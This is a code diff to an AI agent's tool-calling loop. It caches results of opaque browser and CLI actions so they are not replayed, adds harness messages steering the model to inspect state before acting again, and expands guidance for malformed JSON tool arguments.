             budget.add_usage(response, text=(message.content or ""))
+        _record_prompt_calibration(messages, round_system_prompt, response,
+                                   loop_provider or ACTIVE_PROVIDER or DEFAULT_PROVIDER,
+                                   loop_model or MODEL_NAME)
         content = _strip_reasoning(message.content or "")
         native_text = _native_tool_text(message)
         if native_text:
@@ -13608,27 +15456,35 @@ def _run_agent_loop(messages, *, max_turns=10, temperature=0.1, spin=None,
             # Whether to RE-RUN the repeat is a separate question from whether
             # it counts as progress. Re-running a write or a shell command
             # repeats its side effect, so those are served from the previous
-            # output. An opaque external CLI or a browser action can legitimately
-            # observe state that changed outside this process, so those re-run —
-            # they just still do not count as progress.
+            # output. Only named read-only CLI queries refresh external state.
+            # Browser tasks and opaque CLI commands may mutate it, so their
+            # results are retained for the entire request, including timeouts.
             read_key = efficiency.read_signature(name, args, resolve_user_path, PERMISSION_MODE)
             if read_key is None:
                 read_results.clear()
             previous_output = None
             repeated = False
             no_progress = False
-            if read_key is not None and read_key in read_results:
+            opaque_action = (TOOL_SPECS.get(name, {}).get("mode") in {"browser", "cli_anything"}
+                             and name not in _REPEAT_OBSERVATIONS)
+            if opaque_action and sig in action_results:
+                previous_output, repeated = action_results[sig], True
+            elif read_key is not None and read_key in read_results:
                 previous_output, repeated = read_results[read_key], True
             elif ("__parse_error__" not in args and last_completed
                     and sig == last_completed[0]):
                 previous_output, repeated = last_completed[1], True
             if repeated and _is_wait_command(name, args):
                 repeated, previous_output = False, None
-            # Re-running these observes the world, not our own side effect.
-            if repeated and (spec_mode := (TOOL_SPECS.get(name, {}).get("mode") or "")) in _REPEAT_RERUNS:
+            # Only these built-in observation queries are safe to refresh.
+            if repeated and name in _REPEAT_OBSERVATIONS:
                 repeated, previous_output = False, None
                 no_progress = True
             if repeated:
+                if opaque_action:
+                    messages.append(_harness_turn(
+                        "Do not replay this external action. Its effects may already exist, even if it timed out. "
+                        "Inspect the current state with a different observation task before proposing another action."))
                 cached = (f"Tool '{name}' already ran with this output (do not repeat it):\n\n{_tool_result_for_model(name, previous_output)}"
                           if previous_output else f"Already tried {name} with no output. Give your final answer now.")
                 messages.append(_harness_turn(cached))
@@ -13727,11 +15583,16 @@ def _run_agent_loop(messages, *, max_turns=10, temperature=0.1, spin=None,
                     on_result(name, result)
                 malformed_round = True
                 parse_error_retries += 1
+                where = args.get("__parse_error_at__")
                 messages.append(_harness_turn((
-                    f"The arguments for '{name}' could not be parsed as JSON. Do "
-                    "not re-send the same payload unchanged. Send a smaller, "
-                    "simpler one instead: drop every optional argument, keep the "
-                    "JSON on a single line, and include only the required arguments."
+                    f"The arguments for '{name}' could not be parsed as JSON"
+                    + (f" ({where})" if where else "") + ". Do not re-send the "
+                    "same payload unchanged. The usual cause is a double quote "
+                    "inside a string value that is not escaped as \\\" (code "
+                    "with \"\"\"docstrings\"\"\" or f\"...\" strings). Escape every "
+                    "quote and newline inside values. For long file content, "
+                    "write a shorter first part and add the rest with further "
+                    "calls; otherwise send only the required arguments."
                 )))
                 if trace is not None:
                     trace.append({"turn": turn, "type": "tool_arg_parse_error",
@@ -13802,6 +15663,8 @@ def _run_agent_loop(messages, *, max_turns=10, temperature=0.1, spin=None,
 
             usable = (not _plan_step_failed(result)
                       and not result.startswith('ESCALATION_REQUEST'))
+            if opaque_action and not blocked:
+                action_results[sig] = result
             if read_key is not None and usable:
                 if len(read_results) >= 16:
                     read_results.pop(next(iter(read_results)))
@@ -13882,7 +15745,7 @@ def _run_agent_loop(messages, *, max_turns=10, temperature=0.1, spin=None,
     # Max turns reached or forced stop: report the failure, not the beginning of
     # accumulated tool context (which is usually a skill document).
     reason = ("stopped because repeated tool calls made no progress"
-              if forced_stop else f"reached the {policy.limit}-turn limit before completing the task")
+              if forced_stop else _turn_limit_reason(policy.limit))
     wrapped = _answer_from_context(
         messages, system_prompt=(system_prompt() if callable(system_prompt)
                                  else system_prompt),
